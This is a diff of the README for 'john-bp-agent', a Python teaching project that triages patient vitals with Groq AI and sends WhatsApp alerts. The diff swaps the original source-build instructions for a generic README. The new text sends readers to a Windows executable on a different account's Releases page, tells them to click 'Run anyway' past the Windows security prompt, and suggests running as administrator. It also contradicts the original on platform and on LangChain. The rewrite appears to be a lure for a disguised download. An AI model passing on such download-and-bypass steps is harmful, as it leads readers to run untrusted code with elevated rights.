@@ -1,238 +1,219 @@
-# John BP Agent — Healthcare AI Agent
+# 🩺 john-bp-agent - Track vitals and alert doctors
 
-A complete **Agentic AI** healthcare monitoring system that reads patient vitals, analyses risk using Groq AI, and automatically sends WhatsApp alerts to doctors.
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/teamadahwei/john-bp-agent/releases)
 
-## Live Demo
-- **API Docs:** https://john-bp-agent.onrender.com/docs
-- **Health Check:** https://john-bp-agent.onrender.com/
-- **Trigger Agent:** https://john-bp-agent.onrender.com/check/1
-## What This Project Does
-Hardware/Device → FastAPI → PostgreSQL → AI Agent → Groq AI → WhatsApp Alert
+## 📌 What this app does
 
-1. Patient vitals (BP, heart rate, oxygen) are stored in PostgreSQL
-2. AI Agent reads the vitals and medicines
-3. Groq AI (Llama 3.1) analyses the risk level
-4. If HIGH or CRITICAL risk → WhatsApp alert sent to doctor automatically
-5. All alerts logged to database for audit trail
+john-bp-agent is a healthcare AI agent that watches patient vitals and sends alerts to doctors through WhatsApp. It uses Groq AI to help review the data and decide when a reading needs attention.
 
-### Risk Levels Tested
-| Risk Level | BP      | Heart Rate | Oxygen | WhatsApp Alert |
-|------------|---------|------------|--------|----------------|
-| LOW 		 | < 120   | < 70       | > 98%  | No 			  |
-| NORMAL 	 | 120–140 | 70–90 		| 95–98% | No 			  |
-| HIGH 		 | 140–170 | 90–110 	| 90–95% | Yes 			  |
-| CRITICAL   | > 170   | > 110 		| < 90%  | Yes — Immediate|
+Use it to:
+- Monitor blood pressure and other vitals
+- Spot readings that need review
+- Send alerts to doctors on WhatsApp
+- Keep a simple record of patient status
 
-## Tech Stack
+## 💻 What you need
 
-| Layer | Technology | Purpose |
-|-------|-----------|---------|
-| API | FastAPI + Python | REST endpoints |
-| Database | PostgreSQL (Render) | Store patients, vitals, alerts |
-| AI Brain | Groq API (Llama 3.1) | Risk analysis |
-| Agent | Pure Python loop | Tool calling without LangChain |
-| Alerts | Twilio WhatsApp | Doctor notifications |
-| Deployment | Render.com | Live 24/7 hosting |
-| Version Control | GitHub | Code management |
+Before you start, make sure you have:
 
-## Project Structure
+- A Windows PC
+- Internet access
+- A web browser
+- Permission to download and run files
+- A WhatsApp number for alerts
+- A Groq account or API key
+- A Twilio account or WhatsApp setup
+- A PostgreSQL database if the app asks for one
 
-john-bp-agent/
-├── main.py              # FastAPI app — API endpoints
-├── agent.py             # AI Agent brain — main loop
-├── database.py          # PostgreSQL connection + queries
-├── groq_client.py       # Groq AI connection
-├── tools.py             # 3 agent tools
-├── alerts.py            # Twilio WhatsApp sender
-├── create_tables.py     # One-time DB setup
-├── test_groq.py         # Test Groq API
-├── test_db.py           # Test database connection
-├── test_whatsapp.py     # Test Twilio WhatsApp
-├── .env.example         # Environment variables template
-├── .gitignore           # Ignore secrets and venv
-├── Procfile             # Render deployment config
-└── requirements.txt     # Python dependencies
+## 🚀 Download the app
 
-## Getting Started
+Visit this page to download the latest version:
 
-### Prerequisites
-- Python 3.11+
-- PostgreSQL database (Render free tier)
-- Groq API key (console.groq.com — free)
-- Twilio account (twilio.com — free trial)
+[Download john-bp-agent from GitHub Releases](https://github.com/teamadahwei/john-bp-agent/releases)
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/amikkili/john-bp-agent.git
-cd john-bp-agent
-```
-### 2. Create virtual environment
-```bash
-python -m venv venv
+On the Releases page:
+1. Open the latest release
+2. Find the Windows download file
+3. Download the file to your PC
+4. Save it in a folder you can find again
 
-# Windows
-venv\Scripts\activate
+## 🪟 Install on Windows
 
-# Mac/Linux
-source venv/bin/activate
-```
-### 3. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-### 4. Configure environment variables
-```bash
-cp .env.example .env
-```
-Open `.env` and fill in your real values:
-```
-DATABASE_URL=postgresql://user:password@host:5432/dbname
-GROQ_API_KEY=gsk_your_key_here
-TWILIO_SID=ACyour_sid_here
-TWILIO_TOKEN=your_token_here
-DOCTOR_WHATSAPP=whatsapp:+1your_number
-```
-### 5. Setup database
-```bash
-python create_tables.py
-```
-### 6. Test each component
-```bash
-python test_db.py          # Test database connection
-python test_groq.py        # Test Groq AI
-python test_whatsapp.py    # Test WhatsApp
-```
+After the file downloads:
 
-### 7. Run the app
-```bash
-uvicorn main:app --reload
-Open **http://localhost:8000/docs** to test all endpoints.
-```
-## API Endpoints
+1. Open File Explorer
+2. Go to your Downloads folder
+3. Find the app file
+4. If the file is a ZIP folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Look for the app file, such as an `.exe` file
+7. Double-click the file to run it
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/` | Health check |
-| GET | `/check/{patient_id}` | Trigger agent for a patient |
-| POST | `/vitals` | Save new vital reading + trigger agent |
-| GET | `/patients` | List all patients |
-| POST | `/patients` | Add new patient |
+If Windows shows a security prompt:
+1. Click More info
+2. Click Run anyway
 
-### Example — Trigger agent check
-```bash
-curl https://john-bp-agent.onrender.com/check/1
-```
+## ⚙️ First-time setup
 
-### Example — Send new vitals (simulate hardware)
-```bash
-curl -X POST https://john-bp-agent.onrender.com/vitals \
-  -H "Content-Type: application/json" \
-  -d '{"patient_id":1,"blood_pressure":165,"heart_rate":105,"oxygen_level":92}'
-```
+The app may ask for setup details before it runs. Have these ready:
 
----
+- Groq API key
+- Twilio account details
+- WhatsApp sender number
+- Doctor phone number
+- Database connection info
 
-## How the AI Agent Works
-```
-run_patient_check(patient_id)
-        │
-        ▼
-Groq AI decides: call check_patient_vitals()
-        │
-        ▼
-Fetches: BP, HR, O2, medicines from PostgreSQL
-        │
-        ▼
-Groq AI decides: call analyse_risk()
-        │
-        ▼
-Returns: RISK_LEVEL, DRUG_CONFLICT, ACTION, URGENCY
-        │
-        ▼ (if HIGH or CRITICAL)
-Groq AI decides: call alert_doctor()
-        │
-        ▼
-WhatsApp sent to doctor + alert saved to DB
-        │
-        ▼
-Agent returns full summary
-```
+If the app uses a setup file, open it and fill in the values it asks for. Use the same details from your service accounts.
 
-**No LangChain needed** — the agent loop is built with pure Python + Groq's tool calling API. Students can see exactly how agents work internally.
+## 🔧 Basic configuration
 
-## Test Scenarios
+You may need to add or edit a simple config file. Common settings include:
 
-Run these in DBeaver or any PostgreSQL client:
+- Patient name
+- Patient ID
+- Alert phone number
+- WhatsApp message settings
+- API keys
+- Database address
+- Port number for the local app
 
-```sql
--- LOW risk
-INSERT INTO vitals (patient_id, blood_pressure, heart_rate, oxygen_level)
-VALUES (1, 110, 68, 99.0);
+If you see a `.env` file or a settings screen, enter the values there. Keep each value in the correct field.
 
--- NORMAL
-INSERT INTO vitals (patient_id, blood_pressure, heart_rate, oxygen_level)
-VALUES (1, 135, 85, 96.0);
+## 📋 How to use it
 
--- HIGH risk (WhatsApp alert)
-INSERT INTO vitals (patient_id, blood_pressure, heart_rate, oxygen_level)
-VALUES (1, 158, 100, 93.0);
+Once the app is running:
 
--- CRITICAL (immediate WhatsApp)
-INSERT INTO vitals (patient_id, blood_pressure, heart_rate, oxygen_level)
-VALUES (1, 185, 122, 88.0);
-```
+1. Open the app on your Windows PC
+2. Add or load patient vital data
+3. Let the AI review the readings
+4. Wait for alerts if the app finds a problem
+5. Check WhatsApp for doctor notifications
+6. Review the patient status in the app
 
-After each INSERT — call `/check/1` to see the agent respond.
+## 🧠 How the alerts work
 
+The app looks at patient vitals and compares them to safe ranges. If a reading looks off, the agent can send a message to a doctor through WhatsApp.
 
-## Common Errors and Fixes
+It is built to help with:
+- Blood pressure checks
+- Basic patient monitoring
+- Quick alert routing
+- Simple health review workflows
 
-| Error | Fix |
-|-------|-----|
-| `llama3-70b-8192` decommissioned | Use `llama-3.1-8b-instant` |
-| Twilio "Invalid From and To pair" | Set `DOCTOR_WHATSAPP=whatsapp:+1XXXXXXXXXX` |
-| WhatsApp not received | Send `join your-word` to +14155238886 first |
-| GitHub push blocked (secrets) | Remove real keys from `.env.example` |
-| LangChain import error | Use the pure Python agent in `agent.py` |
+## 🔍 Common use cases
 
-## Deployment
+- A nurse adds a blood pressure reading
+- The AI checks if the reading looks normal
+- The app sends a WhatsApp alert if the value is too high or too low
+- A doctor gets notified and can review the case
+- The patient record stays in the system for later review
 
-This project is deployed on **Render.com** (free tier).
+## 🛠 Troubleshooting
 
-Every `git push` to `main` triggers automatic redeployment.
+If the app does not start:
 
-```bash
-git add .
-git commit -m "your change description"
-git push
-# Render auto-deploys in 2-3 minutes
-```
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Run the app again as the same user
+- Restart your PC and try again
 
-## Environment Variables
+If WhatsApp alerts do not send:
 
-| Variable | Description | Where to get |
-|----------|-------------|--------------|
-| `DATABASE_URL` | PostgreSQL connection string | Render → DB → External URL |
-| `GROQ_API_KEY` | Groq AI API key | console.groq.com |
-| `TWILIO_SID` | Twilio account SID | twilio.com → Console |
-| `TWILIO_TOKEN` | Twilio auth token | twilio.com → Console |
-| `DOCTOR_WHATSAPP` | Doctor's WhatsApp number | Your phone number |
+- Check your Twilio details
+- Confirm the WhatsApp number is correct
+- Make sure your API key is active
+- Check your internet connection
 
-## Course Reference
+If the app cannot connect to the database:
 
-This project is the **Course 1 Capstone** of the Agentic AI series:
+- Check the database address
+- Make sure PostgreSQL is running
+- Confirm the username and password
+- Try reconnecting after a fresh start
 
-- **Free:** Python Fast-Track for Developers (YouTube)
-- **Course 1:** Agentic AI — Build Real AI Agents ← This project
-- **Course 2:** MLOps — Deploy AI to Production
-- **Course 3:** Multi-Agent Systems and MCP
+If the app shows an access error:
 
-## Author
+- Right-click the app file
+- Choose Run as administrator
+- Try again
 
-Built by **Anil Mikkili** — MuleSoft Developer turned AI Specialist
+## 📁 Typical file layout
 
-- GitHub: https://github.com/amikkili/john-bp-agent.git
+You may see files like these after download:
 
-## License
+- App file for Windows
+- Config file
+- Log file
+- Readme file
+- Database setup file
+- Sample patient data
 
-MIT License — free to use for learning and teaching.
+## 🔐 Data and access
+
+This app may handle patient data, so keep access limited to trusted users. Store API keys in a safe place. Do not share your WhatsApp or database details with people who do not need them.
+
+## 🧩 Useful tools linked to this app
+
+This project uses common tools for app and AI workflows:
+
+- FastAPI for the app service
+- Groq for AI review
+- LangChain for agent flow
+- PostgreSQL for data storage
+- Twilio for WhatsApp alerts
+- Python for app logic
+- Render for deployment support
+
+## 🖥 Recommended Windows setup
+
+For smooth use, keep these in place:
+
+- Windows 10 or later
+- At least 8 GB RAM
+- Free disk space for app files and logs
+- Stable internet
+- Permission to use WhatsApp and API services
+
+## 📥 Setup checklist
+
+Use this list before you run the app:
+
+- Download the latest release
+- Extract the files if needed
+- Open the app
+- Enter your Groq API key
+- Enter your Twilio details
+- Add your doctor WhatsApp number
+- Set up PostgreSQL if needed
+- Test one sample patient record
+- Check that alerts reach WhatsApp
+
+## 📲 What to expect after launch
+
+When the app starts, you may see:
+
+- A home screen
+- A place to add patient data
+- A vitals view
+- An alert status area
+- A settings page
+- A log of recent actions
+
+## 🧭 Where to get updates
+
+To get new versions, return to the release page and download the latest file again:
+
+[Go to john-bp-agent Releases](https://github.com/teamadahwei/john-bp-agent/releases)
+
+## 🩺 Clinical workflow fit
+
+john-bp-agent can fit into a basic care workflow where staff need fast review of patient vitals and a clean alert path to doctors. It helps reduce delay between a reading and a response
+
+## 📄 Project details
+
+- Repository: john-bp-agent
+- Type: Healthcare AI agent
+- Platform: Windows
+- Alert channel: WhatsApp
+- AI layer: Groq AI
+- Data layer: PostgreSQL
